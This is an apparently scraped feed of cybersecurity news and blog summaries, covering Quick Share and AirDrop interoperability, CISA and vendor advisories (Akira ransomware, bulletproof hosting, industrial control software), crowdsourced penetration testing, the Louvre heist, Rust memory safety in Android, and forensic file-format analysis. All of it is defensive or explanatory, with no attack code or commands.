ensure a seamless experience for both Android and iOS users, Quick Share currently works with AirDrop's \"Everyone for 10 minutes\" mode. This feature does not use a workaround; the connection is direct and peer-to-peer, meaning your data is never routed through a server, shared content is never logged, and no extra data is shared. As with \"Everyone for 10 minutes\" mode on any device when you\u2019re sharing between non-contacts, you can ensure you're sharing with the right person by confirming their device name on your screen with them in person. This implementation using \"Everyone for 10 minutes\u201d mode is just the first step in seamless cross-platform sharing, and we welcome the opportunity to work with Apple to enable \u201cContacts Only\u201d mode in the future. Tested by Independent Security Experts After conducting our own secure product development, internal threat modeling, privacy reviews, and red team penetration tests, we engaged with NetSPI , a leading third-party penetration testing firm, to further validate the security of this feature and conduct an independent security assessment . The assessment found the interoperability between Quick Share and AirDrop is secure, is \u201cnotably stronger\u201d than other industry implementations and does not leak any information. Based on these internal and external assessments, we believe our implementation provides a strong security foundation for cross-platform file sharing for both Android and iOS users. We will continue to evaluate and enhance the implementation\u2019s security in collaboration with additional third-party partners. To complement this deep technical audit, we also sought expert third-party perspective on our approach from Dan Boneh , a renowned security expert and professor at Stanford University: \u201cGoogle\u2019s work on this feature, including the use of memory safe Rust for the core communications layer, is a strong example of how to build secure interoperability, ensuring that cross-platform information sharing remains safe. I applaud the effort to open more secure information sharing between platforms and encourage Google and Apple to work together more on this.\" The Future of File-Sharing Should Be Interoperable This is just the first step as we work to improve the experience and expand it to more devices. We look forward to continuing to work with industry partners to make connecting and communicating across platforms a secure, seamless experience for all users.",

This is the talk. Thirty years ago, a debate raged over whether vulnerability disclosure was good for computer security. On one side, full disclosure advocates argued that software bugs weren\u2019t getting fixed and wouldn\u2019t get fixed if companies that made insecure software wasn\u2019t called out publicly. On the other side, companies argued that full disclosure led to exploitation of unpatched vulnerabilities, especially if they were hard to fix. After blog posts, public debates, and countless mailing list flame wars, there emerged a compromise solution: coordinated vulnerability disclosure, where vulnerabilities were disclosed after a period of confidentiality where vendors can attempt to fix things. Although full disclosure fell out of fashion, disclosure won and security through obscurity lost. We\u2019ve lived happily ever after since...",

CVE-2025-13223 Google Chromium V8 Type Confusion Vulnerability This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise. Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the BOD 22-01 Fact Sheet for more information. Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of KEV Catalog vulnerabilities as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the specified criteria .",

      "title": "CISA Releases Guide to Mitigate Risks from Bulletproof Hosting Providers",
      "summary": "Today, Cybersecurity and Infrastructure Security Agency (CISA), in collaboration with the U.S. National Security Agency, U.S. Department of Defense Cyber Crime Center, U.S. Federal Bureau of Investigation, and international partners, released the guide Bulletproof Defense: Mitigating Risks from Bulletproof Hosting Providers to help Internet Service Providers (ISPs) and network defenders mitigate cybercriminal activity enabled by Bulletproof Hosting (BPH) providers. A BPH provider is an internet infrastructure provider that knowingly leases infrastructure to cybercriminals. These providers enable malicious activities such as ransomware, phishing, malware delivery, and denial-of-service (DoS) attacks, posing an imminent and significant risk to the resilience and safety of critical systems and services. The guide provides recommendations to reduce the effectiveness of BPH infrastructure while minimizing disruptions to legitimate activity. Key Recommendations for ISPs and Network Defenders: Curate malicious resource lists: Use threat intelligence feeds and sharing channels to build lists of malicious resources. Implement filters: Apply filters to block malicious traffic while avoiding disruptions to legitimate activity. Analyze traffic: Monitor network traffic to identify anomalies and supplement malicious resource lists. Use logging systems: Record Autonomous System Numbers (ASNs) and IP addresses, issue alerts for malicious activity, and keep logs updated. Share intelligence: Collaborate with public and private entities to strengthen cybersecurity defenses. Additional Recommendations for ISPs: Notify customers: Inform customers about malicious resource lists and filters, with opt-out options. Provide filters: Offer premade filters for customers to apply in their networks. Set accountability standards: Work with other ISPs to create codes of conduct for BPH abuse prevention. Vet customers: Collect and verify customer information to prevent BPH providers from leasing ISP infrastructure. CISA and its partners urge ISPs and network defenders to implement these recommendations to mitigate risks posed by BPH providers. By reducing the effectiveness of BPH infrastructure, defenders can force cybercriminals to rely on legitimate providers that comply with legal processes.

      "title": "Crowdsourced Penetration Testing: Understanding the Risks for Better Decision-Making",
      "summary": "CPT vs. Bounties : CPT is a time-boxed, structured test for compliance reports with a fixed cost. Bug Bounty is ongoing, open-ended discovery paid per valid vulnerability found. Mitigate Key Risks : Watch for poor researcher vetting, potential data exposure/exfiltration by bad actors, and labor misclassification risks from global contractor engagement. Selection Essentials : Demand rigorous identity verification, confirmed CREST certification for reports, and ethical procurement policies ensuring fair labor standards. Crowdsourced penetration testing promises broad coverage, flexible resourcing, and cost efficiency by tapping into a distributed pool of security testers. Trustwave, A LevelBlue Company, realizes not every organization has the financial resources to partner with a security firm with dedicated penetration testing capabilities. At the same time, we want to make organizations aware of the many pitfalls in the crowdsourced pen-testing market and offer a few pointers on choosing the right vendors. While the benefits of crowdsourced penetration testing are real, so are the risks distinctive to this brand of testing. These can include fake testing agencies, tax implications, and even ethical procurement. To get a better handle on how crowd-based services are delivered, let\u2019s look at who\u2019s doing the work, the data and operational risks to your organization, and practical controls you can use to make informed procurement and governance decisions. Defining Crowdsourced Penetration Testing The term itself is not well-known, but to make it easier, let\u2019s think of it as a close cousin to a bug bounty program, but keep in mind that while the similarities are clear, the differences can be quite stark. A bug bounty program is primarily focused on continuous vulnerability discovery and is designed to run indefinitely, or on an always-on basis, allowing for ongoing risk reduction. It typically has a broad and open-ended scope, often covering all public-facing assets. Because the hackers operate with a freestyle and unstructured methodology, the organization benefits from a large, diverse crowd of testers. The financial model is pay-for-results, meaning the company only pays a bounty for valid, unique vulnerabilities that are found, which can make the total cost unpredictable. The main output is a running list of validated vulnerability reports and security metrics. In contrast, crowdsourced penetration testing is geared towards a structured, time-boxed assessment to fulfill compliance needs or test a new feature. These engagements are time-bound, lasting for a specific period, and operate within a specific and controlled scope defined before the test begins. The testers are a curated, smaller team of highly vetted experts who follow a structured and methodology-driven approach. This results in a comprehensive final report that is ideal for satisfying compliance requirements (like SOC 2 or PCI DSS). The cost is typically a fixed fee or a blended model, providing a more predictable budget. A company should consider crowdsourced penetration testing when they are interested in rooting out lower-risk activities, or when conducting external testing where an organization is not letting the penetration tester in the door. Additionally, price plays a role. Crowdsourced penetration testing tends to be lower cost. How Crowdsourced Penetration Services Are Delivered In a similar manner to a bug bounty program, most crowdsourced testing is delivered through an intermediary platform that coordinates testers, scopes engagements, and aggregates results. Platforms vary widely in how they operate: some are primarily marketplaces (connecting buyers to individual testers), others deliver managed programs (vetting, triage, reporting, and post-test remediation support.) The key differences that affect your risk profile include: Whether the platform manages identity and vetting centrally or leaves it to buyers. How the platform handles disclosure, triage, and remediation workflows. The contractual relationship: direct hire of testers vs. contracting with a platform-as-a-service provider. The Pros and Cons of Global vs Regional Resources Using global testers increases scale and specialized skills (useful for niche technologies) but raises regulatory, legal, and supply-chain risks (export control, cross-border data flows, varying labor laws). Regional resources may offer stronger legal recourse, easier background checks, and cultural/contextual advantages \u2014 but smaller talent pools and potentially higher costs. Who is doing the work \u2014 vetting and trust. Vetting of resources Not all testers are equal, and a proper vetting program is imperative not only to get good results but to protect your organization. Effective vetting should include: Identity verification (document checks, two-factor identification). Criminal / police checks where appropriate and lawful. Skills validation (certificates like CREST challenge tasks, past program history). Reputation metrics (platform ratings, peer endorsements, previously published research). Ensuring the Testers Are Who They Say They Are A major risk with open crowds is impersonation and false identities. Poor vetting can allow criminals or fraudsters to participate and gain entry to your systems. These can include letting state-sponsored or malicious actors who can use testing access as a cover. Risk scenario : A bad actor passes a poorly designed and executed vetting process, is granted scoped access, and later exfiltrates data or establishes persistence under the guise of testing. Potential Exploitation of Workers Crowdsourced models can create labor risks that expose your organization not only to legal issues but also to moral ones. Taxation and superannuation exposure : Are workers engaged as contractors or employees? Misclassification risks can create liability for platforms or buyers. Modern slavery/worker protection : Some platforms may source testers from jurisdictions with poor labor protections; you should consider whether working conditions or coercive practices are involved. Ethical procurement : include clauses requiring platforms to adhere to labor standards and to supply transparency about their worker engagement model. Security Operations Center (SOC) Complacency During Testing One issue to be aware of is SOC complacency. If your SOC treats crowd testing as a controlled exercise, real adversarial activity may be ignored, or conversely, testers may be mistaken for adversaries. Either outcome reduces program value and increases risk. Quality of Deliverables Crowd testing results can range from one-line \u201cbug bounty-like\u201d reports to well-documented exploit chains with remediation advice. Ensure you specify the results you want at the end of testing in any contract. There are three common problems to avoid when arranging tests: Duplicate or low-value findings (noise). Poorly reproducible or insufficiently documented issues. Overly generic remediation advice. Pen Tester Skill Level Crowdsourcing excels at breadth (many scanners and testers run tests concurrently), but not all platforms guarantee depth. If you need advanced adversary simulation, confirm the required skill level and provide a sample of past work. Remember, there\u2019s a difference between: Scripted vulnerability scanning (automated, low custom skill) and Specialized offensive security experts (manual exploitation, creative attack paths). Obtaining the Best Results Possible Peer-review or triage processes significantly improve output quality. Look for platforms that: Triage and validate submissions before delivery. Provide a peer-review or second-opinion mechanism for complex findings. Offer a managed remediation tracking process. The key is not to treat the crowd as a black box: insist on strong vetting, clear contractual protections, technical controls that minimize exposure, and operational processes that preserve SOC effectiveness. When you combine those controls with sensible scoping and human triage, crowd testing becomes a powerful discovery engine \u2014 and not an unmanaged risk. In Summary To mitigate your risk and provide the highest value to your organization, look to the track record of your proposed penetration testing supplier, including the following: The heritage of your supplier, are they committed to your security? Independent references, whilst organizations will have Non-Disclosure Agreements in place, most organizations should be able to facilitate a call with a customer prior to contract execution. Industry certifications, CREST being a great example, allowing you to be sure that the cybersecurity companies you engage to test and protect your systems are reputable and competent. Ask for redacted example reports that align with your required scope, and know the quality of what you will receive in advance. Finally, if any of the points raised here give you pause, remember that Trustwave SpiderLabs has dedicated teams of pen testers with a long history of conducting highly effective tests that will improve your security.",

For more information see the associated Schneider Electric security advisory SEVD-2025-315-02 EcoStruxure Machine SCADA Expert & Pro-face BLUE Open Studio - PDF Version The CSAF version is available here . Schneider Electric strongly recommends the following industry cybersecurity best practices: Locate control and safety system networks and remote devices behind firewalls and isolate them from the business network. Install physical controls so no unauthorized personnel can access industrial control and safety systems, components, peripheral equipment, and networks. Place all controllers in locked cabinets and never leave them in the \"Program\" mode. Never connect programming software to any network other than the network intended for that device. Scan all methods of mobile data exchange with the isolated network such as CDs, USB drives, etc. before use in the terminals or any node connected to these networks. Never allow mobile devices that have connected to any other network besides the intended network to connect to the safety or control networks without proper sanitation. Minimize network exposure for all control system devices and systems and ensure that they are not accessible from the Internet. When remote access is required, use secure methods, such as virtual private networks (VPNs). Recognize that VPNs may have vulnerabilities and should be updated to the most current version available. Also, understand that VPNs are only as secure as the connected devices. For more information, refer to the Schneider Electric Recommended Cybersecurity Best Practices document.

      "title": "Art and Science: Cyber and Physical Security Convergence Deficiencies in the Louvre Heist",
      "summary": "Cyber meets physical security: Weak passwords and outdated systems may have opened the door to the thieves. A warning for all industries: The Louvre incident shows why converging cybersecurity and physical security is essential. In eight short minutes on October 25, 2025, a group of thieves captured the world\u2019s attention and imagination, perpetuating a daring heist in broad daylight and escaping with approximately \u20ac88 million worth of prized artwork from the planet\u2019s most visited museum: The Louvre. Within the security community, the first successful robbery from the iconic Parisian landmark since 1998 was a bombshell story. But the \u201csecurity community\u201d is large and diverse, and very little of the public dialogue regarding the heist touched specifically upon cybersecurity. These stolen masterpieces were not flush cryptocurrency wallets or valuable pieces of NFT art secreted away on a thumb drive or exfiltrated to a remote server, the thieves employed some of the oldest tools in the burglary game: a ladder for climbing and a sharp edge for cutting. So far, law enforcement has arrested a total of seven people in connection with the heist, according to published reports . What\u2019s the Connection to Cyber? While details about the security weaknesses that enabled the heist are still forthcoming, the mechanical lift and electrical angle grinder are not generally the tools of the cybercriminal. As a result, the Louvre heist, at first glance, seemed largely distinct from the cybersecurity sphere, until additional details emerged regarding the museum\u2019s cybersecurity controls. Details from past audits revealed the museum\u2019s security posture was fraught with vulnerabilities and security hygiene concerns. Of note, these security weaknesses pertained directly to the museum\u2019s network of physical access control systems, including surveillance cameras secured with the much-ballyhooed password \u201cLOUVRE.\u201d To understand how such rudimentary weaknesses could have persisted within such critical anti-theft infrastructure, we must consider the convergence of cyber and physical security. Readers who have enjoyed Dan Brown\u2019s The Da Vinci Code will be aware that the Louvre is equipped with a wide array of physical security systems, including deployable gates and mantraps that can be triggered during a burglary attempt. What may not be so obvious is the extent to which these modern physical security controls are supported by an information technology infrastructure. As early as 2021, CISA warned of the Cybersecurity and Physical Security Convergence , calling out an \u201cincreasingly interconnected mesh of cyber-physical systems (CPS)\u201d. Anyone who has badged into an office space has experienced this phenomenon, in which an IT-supported access control system affects a change in the physical world in the form of an unlocked door. The problem, CISA continues in the same 2021 publication, is that the convergence of physical and cybersecurity teams has not kept pace with the expansion of CPS environments. Seen as unique business functions with distinct responsibilities and skillsets, cyber and physical security groups have traditionally operated in siloes, often reporting to different members of executive leadership. As a result, organizations face increased risk that critical CPS technologies owned and operated within the physical security function are not managed with cyber resilience in mind. Returning to the Louvre specifically, we see an organization whose physical security controls are at risk of being undermined by the unstable cyber foundation on which they operate. Past cybersecurity audits demonstrate a spate of information security issues at the museum dating back to 2014, which prompted repeated warnings and improvement recommendations from the French National Cybersecurity Agency (ANSSI). Among these findings are a few most egregious, including the aforementioned password selection and a reliance upon obsolete security software purchased in 2003 and running on the longtime end-of-life Windows Server 2003 operating system. What We Know and What We Don\u2019t Know, Yet While we know about past cybersecurity issues, without the release of complete details from the ongoing Louvre investigation, it is impossible at this time to ascribe blame to the museum\u2019s cybersecurity deficiencies. However, at the very least we can identify several scenarios in which the security vulnerabilities identified in the ANSSI audit reports could feasibly enable or contribute to a successful heist. Slick talking and elaborate costumes aside, Clooney and Co. cannot reach the fabled casino vault in Ocean\u2019s Eleven without first compromising the integrity of security camera feeds. Cyber compromise of camera systems limits their effectiveness and contributes to a physical security breach. Given the eye-popping value assigned to the stolen art, the incident at the Louvre serves to illustrate the value of an integrated security program, in which CPS systems receive the maintenance required to stay resilient against physical and digital attacks. This valuable lesson applies well outside the realm of grand larceny as well, as the proliferation of CPS technology could allow an attacker to manipulate medical devices or disable an electrical power grid. All organizations would do well to assess their CPS footprint and foster increased collaboration between Cyber and Physical security specialists. By viewing physical security through a cyber lens, organizations can better understand how real-world vulnerabilities can lead to digital or physical compromise and impact. At LevelBlue, we help our clients bridge the gap between the digital and physical worlds by assessing how building access, surveillance, and employee processes can open or close doors to cyber and physical threats.",

      "title": "Rust in Android: move fast and fix things",
      "summary": "Posted by Jeff Vander Stoep, Android Last year, we wrote about why a memory safety strategy that focuses on vulnerability prevention in new code quickly yields durable and compounding gains. This year we look at how this approach isn\u2019t just fixing things, but helping us move faster . The 2025 data continues to validate the approach, with memory safety vulnerabilities falling below 20% of total vulnerabilities for the first time. Updated data for 2025. This data covers first-party and third-party (open source) code changes to the Android platform across C, C++, Java, Kotlin, and Rust. This post is published a couple of months before the end of 2025, but Android\u2019s industry-standard 90-day patch window means that these results are very likely close to final. We can and will accelerate patching when necessary. We adopted Rust for its security and are seeing a 1000x reduction in memory safety vulnerability density compared to Android\u2019s C and C++ code . But the biggest surprise was Rust's impact on software delivery. With Rust changes having a 4x lower rollback rate and spending 25% less time in code review , the safer path is now also the faster one. In this post, we dig into the data behind this shift and also cover: How we\u2019re expanding our reach: We're pushing to make secure code the default across our entire software stack. We have updates on Rust adoption in first-party apps, the Linux kernel, and firmware. Our first rust memory safety vulnerability...almost: We'll analyze a near-miss memory safety bug in unsafe Rust: how it happened, how it was mitigated, and steps we're taking to prevent recurrence. It\u2019s also a good chance to answer the question \u201cif Rust can have memory safety issues, why bother at all?\u201d Building Better Software, Faster Developing an operating system requires the low-level control and predictability of systems programming languages like C, C++, and Rust. While Java and Kotlin are important for Android platform development, their role is complementary to the systems languages rather than interchangeable. We introduced Rust into Android as a direct alternative to C and C++, offering a similar level of control but without many of their risks. We focus this analysis on new and actively developed code because our data shows this to be an effective approach . When we look at development in systems languages (excluding Java and Kotlin), two trends emerge: a steep rise in Rust usage and a slower but steady decline in new C++. Net lines of code added: Rust vs. C++, first-party Android code. This chart focuses on first-party (Google-developed) code (unlike the previous chart that included all first-party and third-party code in Android.) We only include systems languages, C/C++ (which is primarily C++), and Rust. The chart shows that the volume of new Rust code now rivals that of C++, enabling reliable comparisons of software development process metrics. To measure this, we use the DORA 1 framework, a decade-long research program that has become the industry standard for evaluating software engineering team performance. DORA metrics focus on: Throughput: the velocity of delivering software changes. Stability: the quality of those changes. Cross-language comparisons can be challenging. We use several techniques to ensure the comparisons are reliable. Similar sized changes: Rust and C++ have similar functionality density, though Rust is slightly denser. This difference favors C++, but the comparison is still valid. We use Gerrit\u2019s change size definitions . Similar developer pools: We only consider first-party changes from Android platform developers. Most are software engineers at Google, and there is considerable overlap between pools with many contributing in both. Track trends over time: As Rust adoption increases, are metrics changing steadily, accelerating the pace, or reverting to the mean? Throughput Code review is a time-consuming and high-latency part of the development process. Reworking code is a primary source of these costly delays. Data shows that Rust code requires fewer revisions. This trend has been consistent since 2023. Rust changes of a similar size need about 20% fewer revisions than their C++ counterparts. In addition, Rust changes currently spend about 25% less time in code review compared to C++. We speculate that the significant change in favor of Rust between 2023 and 2024 is due to increased Rust expertise on the Android team. While less rework and faster code reviews offer modest productivity gains, the most significant improvements are in the stability and quality of the changes. Stability Stable and high-quality changes differentiate Rust. DORA uses rollback rate for evaluating change stability. Rust's rollback rate is very low and continues to decrease, even as its adoption in Android surpasses C++. For medium and large changes, the rollback rate of Rust changes in Android is ~4x lower than C++. This low rollback rate doesn't just indicate stability; it actively improves overall development throughput. Rollbacks are highly disruptive to productivity, introducing organizational friction and mobilizing resources far beyond the developer who submitted the faulty change. Rollbacks necessitate rework and more code reviews, can also lead to build respins, postmortems, and blockage of other teams. Resulting postmortems often introduce new safeguards that add even more development overhead. In a self-reported survey from 2022 , Google software engineers reported that Rust is both easier to review and more likely to be correct. The hard data on rollback rates and review times validates those impressions. Putting it all together Historically, security improvements often came at a cost. More security meant more process, slower performance, or delayed features, forcing trade-offs between security and other product goals. The shift to Rust is different: we are significantly improving security and key development efficiency and product stability metrics. Expanding Our Reach With Rust support now mature for building Android system services and libraries, we are focused on bringing its security and productivity advantages elsewhere. Kernel: Android\u2019s 6.12 Linux kernel is our first kernel with Rust support enabled and our first production Rust driver. More exciting projects are underway, such as our ongoing collaboration with Arm and Collabora on a Rust-based kernel-mode GPU driver . Firmware: The combination of high privilege, performance constraints, and limited applicability of many security measures makes firmware both high-risk, and challenging to secure. Moving firmware to Rust can yield a major improvement in security. We have been deploying Rust in firmware for years now , and even released tutorials , training , and code for the wider community. We\u2019re particularly excited about our collaboration with Arm on Rusted Firmware-A . First-party applications: Rust is ensuring memory safety from the ground up in several security-critical Google applications, such as: Nearby Presence : The protocol for securely and privately discovering local devices over Bluetooth is implemented in Rust and is currently running in Google Play Services. MLS : The protocol for secure RCS messaging is implemented in Rust and will be included in the Google Messages app in a future release. Chromium: Parsers for PNG , JSON , and web fonts have been replaced with memory-safe implementations in Rust, making it easier for Chromium engineers to deal with data from the web while following the Rule of 2 . These examples highlight Rust's role in reducing security risks, but memory-safe languages are only one part of a comprehensive memory safety strategy . We continue to employ a defense-in-depth approach, the value of which was clearly demonstrated in a recent near-miss. Our First Rust Memory Safety Vulnerability...Almost We recently avoided shipping our very first Rust-based memory safety vulnerability: a linear buffer overflow in CrabbyAVIF . It was a near-miss. To ensure the patch received high priority and was tracked through release channels, we assigned it the identifier CVE-2025-48530 . While it\u2019s great that the vulnerability never made it into a public release , the near-miss offers valuable lessons. The following sections highlight key takeaways from our postmortem. Scudo Hardened Allocator for the Win A key finding is that Android\u2019s Scudo hardened allocator deterministically rendered this vulnerability non-exploitable due to guard pages surrounding secondary allocations . While Scudo is Android\u2019s default allocator, used on Google Pixel and many other devices, we continue to work with partners to make it mandatory. In the meantime, we will issue CVEs of sufficient severity for vulnerabilities that could be prevented by Scudo. In addition to protecting against overflows, Scudo\u2019s use of guard pages helped identify this issue by changing an overflow from silent memory corruption into a noisy crash. However, we did discover a gap in our crash reporting: it failed to clearly show that the crash was a result of an overflow, which slowed down triage and response. This has been fixed, and we now have a clear signal when overflows occur into Scudo guard pages. Unsafe Review and Training Operating system development requires unsafe code, typically C, C++, or unsafe Rust (for example, for FFI and interacting with hardware), so simply banning unsafe code is not workable. When developers must use unsafe, they should understand how to do so soundly and responsibly To that end, we are adding a new deep dive on unsafe code to our Comprehensive Rust training . This new module, currently in development, aims to teach developers how to reason about unsafe Rust code, soundness and undefined behavior, as well as best practices like safety comments and encapsulating unsafe code in safe abstractions. Better understanding of unsafe Rust will lead to even higher quality and more secure code across the open source software ecosystem and within Android. As we'll discuss in the next section, our unsafe Rust is already really quite safe. It\u2019s exciting to consider just how high the bar can go. Comparing Vulnerability Densities This near-miss inevitably raises the question: \"If Rust can have memory safety vulnerabilities, then what\u2019s the point?\" The point is that the density is drastically lower. So much lower that it represents a major shift in security posture. Based on our near-miss, we can make a conservative estimate. With roughly 5 million lines of Rust in the Android platform and one potential memory safety vulnerability found (and fixed pre-release), our estimated vulnerability density for Rust is 0.2 vuln per 1 million lines (MLOC). Our historical data for C and C++ shows a density of closer to 1,000 memory safety vulnerabilities per MLOC. Our Rust code is currently tracking at a density orders of magnitude lower: a more than 1000x reduction. Memory safety rightfully receives significant focus because the vulnerability class is uniquely powerful and (historically) highly prevalent. High vulnerability density undermines otherwise solid security design because these flaws can be chained to bypass defenses, including those specifically targeting memory safety exploits. Significantly lowering vulnerability density does not just reduce the number of bugs; it dramatically boosts the effectiveness of our entire security architecture. The primary security concern regarding Rust generally centers on the approximately 4% of code written within unsafe{} blocks. This subset of Rust has fueled significant speculation, misconceptions, and even theories that unsafe Rust might be more buggy than C . Empirical evidence shows this to be quite wrong. Our data indicates that even a more conservative assumption, that a line of unsafe Rust is as likely to have a bug as a line of C or C++, significantly overestimates the risk of unsafe Rust. We don\u2019t know for sure why this is the case, but there are likely several contributing factors: unsafe{} doesn't actually disable all or even most of Rust\u2019s safety checks (a common misconception). The practice of encapsulation enables local reasoning about safety invariants. The additional scrutiny that unsafe{} blocks receive. Final Thoughts Historically, we had to accept a trade-off: mitigating the risks of memory safety defects required substantial investments in static analysis, runtime mitigations, sandboxing, and reactive patching. This approach attempted to move fast and then pick up the pieces afterwards. These layered protections were essential, but they came at a high cost to performance and developer productivity, while still providing insufficient assurance. While C and C++ will persist, and both software and hardware safety mechanisms remain critical for layered defense, the transition to Rust is a different approach where the more secure path is also demonstrably more efficient. Instead of moving fast and then later fixing the mess, we can move faster while fixing things. And who knows, as our code gets increasingly safe, perhaps we can start to reclaim even more of that performance and productivity that we exchanged for security, all while also improving security.

      "summary": "In writing Investigating Windows Systems , published in 2018, I made use of publicly available images found on the Internet. Some were images posted as examples of techniques, others were posted by professors running courses, and some were from CTFs. If you have read the book, you'll know that for each of the images, I either used or made a more \"real world\" scenario, something that aligned much more closely to my experiences over two and a half decades of DF/IR work, a good bit of which was consulting. During that time, and at several different companies, we'd have an \"IR hotline\" folks could call, and request computer incident response...this is something many firms continue to do. Those firms also very often had \"intake forms\", documents an analyst would fill out with pertinent information from a caller or customer, which very often included investigative goals. Over the years, the sites from which I downloaded some of the images I used have disappeared, which is unfortunate, but not a deal killer. The intent and value of the book isn't about the images, but rather, about the process. The processes used, even those where an image of a Windows XP system was used, can be replicated, developed, and extended for any Windows OS. Brett Shavers recently posted on LinkedIn , pointing the repository of available images he's compiled at DFIR.Training . Over at Stark4N6 , we see another repository of images , this one called The Evidence Locker . Here's Kevin's LinkedIn post with a description of the site. If you're not interested in downloading full or partial images, I recently took a look at an infostealer sample , from the perspective of file formats. Fortunately, the OP provided a hash for the sample they looked at, which allowed me to find a site from which I could download a copy of the sample. I'm not a malware RE guy, but what I do try to do is follow Jesse Kornblum's example of using all the parts of the buffalo , and exploit file format metadata for threat intel purposes.",

MITIGATIONS AVEVA recommends that organizations evaluate the impact of this vulnerability based on their operational environment, architecture, and product implementation. Users using the affected product versions should take the following actions to mitigate the risk of exploit: Apply AVEVA Edge 2023 R2 P01 Security Update and migrate old project files. For projects that cannot be migrated (e.g. backups or transient copies), evaluate the risk of potential password leakage from these files and implement stricter read access controls to protect these unsafe files. Require AVEVA Edge users to change their passwords. Important: Edge project migration from older versions to 2023 R2 P01 is one-way due to the change in password hashing algorithms. The following general defensive measures are recommended: Access Control Lists should be applied to all folders where users will save and load project files. Maintain a trusted chain-of-custody on project files during creation, modification, distribution, and use. Apply data-protection at the project level with a strong master password. For configuration step-by-step refer to AVEVA Edge \"Technical Reference Manual\" > Project Overview > Configuring Additional Project Settings > Options Tab > Data Protection. If passwords are being used as function parameters inside project documents (such as scripts or worksheets), it is recommended to remove those passwords and use project tags instead. For more information on tags refer to AVEVA Edge \"Technical Reference Manual\" > Tags and the Tag Database > About Tags and the Project Database. For information on how to reach AVEVA support for your product, please refer to this link: AVEVA Customer Support . For more information, see AVEVA's Security Bulletin AVEVA-2025-006 or AVEVA's bulletins page . CISA recommends users take defensive measures to minimize the risk of exploitation of this vulnerability, such as: Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet .

      "summary": "Today, Cybersecurity and Infrastructure Security Agency (CISA), in collaboration with the Federal Bureau of Investigation, Department of Defense Cyber Crime Center, Department of Health and Human Services, and international partners, released an updated joint Cybersecurity Advisory, #StopRansomware: Akira Ransomware , to provide network defenders with the latest indicators of compromise, tactics, techniques, and procedures, and detection methods associated with Akira ransomware activity. This advisory reflects new findings as of Nov. 13, 2025, highlighting Akira ransomware\u2019s evolution and continued threat to critical infrastructure sectors. Akira ransomware threat actors, associated with groups such as Storm-1567, Howling Scorpius, Punk Spider, and Gold Sahara, have expanded their capabilities, targeting small and medium-sized businesses as well as larger organizations across sectors including Manufacturing, Educational Institutions, Information Technology, Healthcare, Financial, and Food and Agriculture. Key Updates: Initial Access : Threat actors exploit vulnerabilities in edge devices and backup servers, such as authentication bypass, cross-site scripting, buffer overflow, and compromise credentials through brute-force techniques. Discovery : Threat actors use command line techniques to accomplish network and domain discovery. Defense Evasion : Threat actors use remote management and monitoring tools such as Anydesk and LogMeIn to mimic administrator activity, and modify firewall settings, terminate antivirus processes and uninstall EDR systems. Privilege Escalation : Threat actors deploy POORTRY malware to modify BYOVD configurations on vulnerable drivers, create administrator accounts, steal administrator login credentials, and bypass VMDK protections, as well as exploit Veeam vulnerabilities. Lateral Movement : Threat actors use remote access tools and protocols like RDP, SSH, and steal Kerberos authentication tickets to move within networks. Command and Control : Threat actors use Ngrok to establish encrypted sessions, SystemBC malware as a remote access trojan, and STONETOP malware to deploy Akira payloads. Exfiltration and Impact : Threat actors use protocols such as FTP, SFTP, and cloud services to exfiltrate data. Encryption : Threat actors use a new Akira_v2 ransomware variant that enables faster encryption speeds and further inhibits system recovery. CISA and its partners strongly encourage organizations to apply patches for known vulnerabilities, especially those affecting VPN products and backup servers, and enforce multifactor authentication for all remote access services. Organizations should monitor unauthorized domain account creation and unusual network activity while deploying endpoint detection and response solutions to enhance security.

      "title": "File Formats",
      "summary": "I'm a huge fan of MS file formats, mostly because they provide for the possibility of an immense (and often untapped, unexploited) amount of metadata. Anyone who's followed me for any length of time, or has read my blog, knows that I'm a huge fan of file formats such as Registry hives (and non-Registry files with the same structure), as well as LNK files. Historically, lots of different MS file formats have contained significant, and often damning, metadata. Anyone remember the issue of MSWord metadata that the Blair administration encountered over two decades ago? I shared some information related to coding, using the file as an exemplar, in the WindowsIR blog. I ran across a LinkedIn post from Maurice Fielenbach , where he talked about an infostealer bundled in an MSI file. Interestingly enough, MSI files are structured storage files, following the OLE format, albeit with different streams, the same as MSWord docs and JumpList files . I'm not a malware RE guy, so I don't have a specialized tool set for parsing these kinds of files. I generally start with the MiTeC Structured Storage Viewer , something I've used before. In the image to the left, you can see the SummaryInformation block parsed and visible in MSSV. If you read through the comments, M alCat is recommended as a tool to use to run or click through the structure of this file format, and others. This looks like a great possibility, and to be honest, if you're into malware analysis, the MalCat blog looks really informative, as well. If you're interested in a sample to work with yourself, I found one at MalwareBazaar . In his LinkedIn post, Maurice said, \"I highly recommend taking a deeper look at the MSI file format itself and familiarizing yourself with common installer frameworks such as WiX.\" I'd agree, particularly given that the test.msi image shows that the creating application was the \"WiX Toolset\". Regardless of the tools you use, and the area of cybersecurity that you're in or focused on, information like this can expand your knowledge base as to what's possible, or by providing new directions for study or skill expansion. This is not only valuable as a malware or DF analyst, but also for threat intel analysts, as this information can add context and granularity to the intel you're developing.",

